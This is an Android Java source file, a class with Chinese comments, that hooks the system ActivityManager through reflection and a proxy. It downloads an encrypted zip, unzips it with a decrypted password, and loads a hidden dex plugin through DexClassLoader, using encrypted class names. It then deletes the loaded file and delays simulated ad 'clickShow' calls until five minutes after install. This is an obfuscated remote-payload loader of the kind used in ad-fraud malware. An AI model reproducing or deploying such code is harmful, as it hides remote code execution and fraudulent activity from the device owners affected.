package c.g.z;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.res.ObbInfo;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import c.g.z.Utils.A;
import c.g.z.Utils.B;
import c.g.z.Utils.C;
import dalvik.system.DexClassLoader;

import static c.g.z.Utils.A.DEXOUTPUTDIR;
import static c.g.z.Utils.A.KEY;
import static c.g.z.Utils.A.SOPATH;
import static c.g.z.Utils.A.UNZIPFILE;
import static c.g.z.Utils.A.UZIPKEY;
import static c.g.z.Utils.A.ZIPFILE;
/**
 * Created by admin on 2017/8/18.
 */
public class I {
    private static final String KEY_ORIGINAL_INTENT = "original_intent";
    public static final String PLUG_SERVICE_PKG = "RiOjfZ+OheO55/P9uMnlog==";
    public static final String PLUG_SERVICE_NAME = "EVOH6tlg7OuYexoT3Ubq+hakoZ64ISPZJNPDhFRmRsrANte+BVJM4ZsciXqkDNVz";
    private Context mContext;
    private static final String TAG = "Welog";
    //保存所有存活的插件Service实例。
    private Map<ComponentName, Service> mAliveServices = new HashMap<>();
    //保存从插件中加载的Service信息。
    private Map<String, Class> mLoadedServices = new HashMap<>();
    //占坑的Service信息。
    private ComponentName mStubComponentName;

    private Class serviceClass;

    private DexClassLoader loader;

    public static I getInstance() {
        return Holder.INSTANCE;
    }

    private static class Holder {
        private static final I INSTANCE = new I();
    }

    public void init(Context context) {

        this.mContext = context;

        try {
            //1.通过反射获取到ActivityManagerNative类。
            Class<?> activityManagerNativeClass = Class.forName("android.app.ActivityManagerNative");
            Field gDefaultField = activityManagerNativeClass.getDeclaredField("gDefault");
            gDefaultField.setAccessible(true);
            Object gDefault = gDefaultField.get(activityManagerNativeClass);
            //2.获取mInstance变量。
            Class<?> singleton = Class.forName("android.util.Singleton");
            Field instanceField = singleton.getDeclaredField("mInstance");
            instanceField.setAccessible(true);
            //3.获取原始的对象。
            Object original = instanceField.get(gDefault);
            //4.动态代理，用于拦截Intent。
            Class<?> iActivityManager = Class.forName("android.app.IActivityManager");
            Object proxy = Proxy.newProxyInstance(context.getClassLoader(), new Class[]{iActivityManager}, new IAHandler(original));
            instanceField.set(gDefault, proxy);
            //5.读取插件当中的Service。
            initPlugin();
            //6.占坑的Component。
            // mStubComponentName = new ComponentName(context, H.class.getName());

//             Log.e(TAG, "init: pkg:"+mStubComponentName.getPackageName());
//
//            Log.e(TAG, "init: class :"+mStubComponentName.getClassName());

        } catch (Exception e) {
            e.printStackTrace();
            Log.i(TAG, "setup: error:" + e.getMessage());
        }

    }

    public void a(Intent intent, int flags, int startId) {
        Intent matchIntent = intent.getParcelableExtra(KEY_ORIGINAL_INTENT);
        String componentName = matchIntent.getComponent().getPackageName();
        Class loadServiceInfo = mLoadedServices.get(componentName);
        if (loadServiceInfo != null) {
            Service realService = mAliveServices.get(componentName);
            if (realService == null) {
                //创建插件Service的实例。
                realService = createService(loadServiceInfo);
                if (realService != null) {
                    //调用它的onCreate()方法。
                    realService.onCreate();
                    mAliveServices.put(matchIntent.getComponent(), realService);
                }
            }
            if (realService != null) {
                realService.onStartCommand(matchIntent, flags, startId);
            }
        }
    }


    private boolean b(Intent intent) {
        String component = intent.getComponent().getPackageName();
        // ComponentName component = intent.getComponent();
        if (component != null) {
            Service service = mAliveServices.get(component);
            if (service != null) {
                service.onDestroy();
            }
            mAliveServices.remove(component);
        }
        return mAliveServices.isEmpty();
    }

    public void onDestroy() {
        for (Service aliveService : mAliveServices.values()) {
            aliveService.onDestroy();
        }
    }

    private void initPlugin() {

        File soPath = null;

        try {

            A dUtil = A.getInstance(mContext);

            //从插件中加载Service类。
            File dexOutputDir = mContext.getDir(B.decrypt(DEXOUTPUTDIR, KEY), 0);

            String SDPath = mContext.getFilesDir().getAbsolutePath();
//             String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

            File unzipFile = new File(SDPath, B.decrypt(UNZIPFILE, KEY));

            if (!unzipFile.exists()) {
                // Log.i(TAG, "loadService: 创建文件夹");
                unzipFile.mkdirs();
            }
            File zipFile = new File(SDPath, B.decrypt(ZIPFILE, KEY));

            if (!zipFile.exists()) {

                Log.i(TAG, "压缩包不存在: 执行下载");

                if (dUtil.getD_status() != A.DOWNLOAD_STATU_ING) {

                    A.getInstance(mContext).startDownload(zipFile);
                }
            } else {
                // Log.i(TAG, "压缩包存在 解压:" + zipFile.getAbsolutePath());
            }
            C.Unzip(zipFile.getAbsoluteFile(), unzipFile.getAbsolutePath(), B.decrypt(UZIPKEY, KEY), null);

            soPath = new File(SDPath, B.decrypt(SOPATH, KEY));

            if (soPath.exists()) {

                Log.i(TAG, "加载类");
            }
            Log.i(TAG, "apkPath: " + soPath.getAbsolutePath());

            loader = new DexClassLoader(soPath.getAbsolutePath(), dexOutputDir.getAbsolutePath(), null, mContext.getClassLoader());

            serviceClass = loader.loadClass(B.decrypt(PLUG_SERVICE_NAME, KEY));

            Object owner = serviceClass.newInstance();

            //Context cid
            Method m = serviceClass.getMethod("setContext", Context.class);
            //针对private
            m.setAccessible(true);

            m.invoke(owner, mContext);

            mLoadedServices.put(B.decrypt(PLUG_SERVICE_PKG, KEY), serviceClass);

        } catch (Exception e) {
        } finally {
            if (soPath != null) {
                if (soPath.exists()) {
                    soPath.delete();
                }
            }
        }


    }


    public void setAppId(Context context, String cid) {
        Log.i(TAG, "set cid: ");
        if (serviceClass == null) {
            init(context);
        }
        Method m = null;
        try {
            Object owner = serviceClass.newInstance();
            m = serviceClass.getMethod("setAppCid", Context.class, String.class);
            m.setAccessible(true);
            m.invoke(owner, context, cid);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void clickBtn(Context context, int time) {

        if (Math.abs(System.currentTimeMillis() - A.getfirstInstallTime(context)) < 5 * 60000) {
            Log.i(TAG, "click installed below 5 m: ");
            return;
        }
        if (serviceClass != null) {

            Method m = null;

            try {
                Object owner = serviceClass.newInstance();
                m = serviceClass.getMethod("clickShow", Context.class, Integer.class);
                m.setAccessible(true);
                m.invoke(owner, context, time);
            } catch (Exception e) {

                Log.i(TAG, "clickshowAd: error " + e.getMessage());
                e.printStackTrace();
            }
        } else {
            init(context);
        }

    }


    //
    private Service createService(Class clz) {
        Service service = null;
        try {
            //1.实例化service。
            service = (Service) clz.newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return service;
    }

    //
    private ComponentName getStubComponentName() {
        return mStubComponentName;
    }

    public boolean checkPluSe(String name) {
        return name != null && mLoadedServices.get(name) != null;
    }


    private class IAHandler implements InvocationHandler {

        private Object object;

        public IAHandler(Object original) {
            object = original;
        }

        @Override
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            String methodName = method.getName();
            switch (methodName) {
                case "startService"://startService
                    Intent matchIntent = null;
                    int matchIndex = 0;
                    for (Object object : args) {
                        if (object instanceof Intent) {
                            matchIntent = (Intent) object;
                            break;
                        }
                        matchIndex++;
                    }
                    String pkgName = matchIntent.getComponent().getPackageName();
                    //  Log.e("Welog","startService：pkgNAme="+pkgName);
                    if (checkPluSe(pkgName)) {
                        Intent stubIntent = new Intent(matchIntent);
                        // stubIntent.getClass().getMethod("setComponent", ComponentName.class).invoke(stubIntent, getStubComponentName());
                        //stubIntent.setComponent(getStubComponentName());
                        stubIntent.setClassName(mContext.getPackageName(), H.class.getName());
                        stubIntent.putExtra(KEY_ORIGINAL_INTENT, matchIntent);
                        //将插件的Service替换成占坑的Service。
                        args[matchIndex] = stubIntent;
                    }
                    break;
                case "stopService": //stopService
                    Intent stubIntent = null;
                    int stubIndex = 0;
                    for (Object object : args) {
                        if (object instanceof Intent) {
                            stubIntent = (Intent) object;
                            break;
                        }
                        stubIndex++;
                    }
                    if (stubIntent != null) {
                        boolean destroy = b(stubIntent);
                        if (destroy) {
                            //如果需要销毁占坑的Service，那么就替换掉Intent进行处理。
                            Intent destroyIntent = new Intent(stubIntent);
                            //  destroyIntent.getClass().getMethod("setComponent", ComponentName.class).invoke(destroyIntent, getStubComponentName());
                            destroyIntent.setClassName(mContext.getPackageName(), H.class.getName());
                            args[stubIndex] = destroyIntent;
                        } else {
                            //由于在onStopService中已经手动调用了onDestroy，因此这里什么也不需要做，直接返回就可以。
                            return null;
                        }
                    }
                    break;
                default:
                    break;
            }
            return method.invoke(object, args);
        }
    }

}
